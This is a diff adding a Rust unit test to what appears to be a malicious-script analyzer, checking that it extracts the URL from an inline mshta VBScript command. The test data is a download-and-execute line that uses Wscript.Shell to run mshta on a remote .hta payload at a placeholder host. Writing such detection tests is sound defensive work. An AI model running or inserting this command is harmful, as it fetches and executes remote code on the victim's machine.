@@ -8065,6 +8065,23 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_inline_vbscript_shell_run_url_is_scanned() {
+        let script = br#"mshta vbscript:CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#;
+        let report = crate::analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://mshta-inline-vbs.example/payload.hta"
+                )
+            }),
+            "inline mshta VBScript URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn mshta_liberal_url_emits_normalized_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
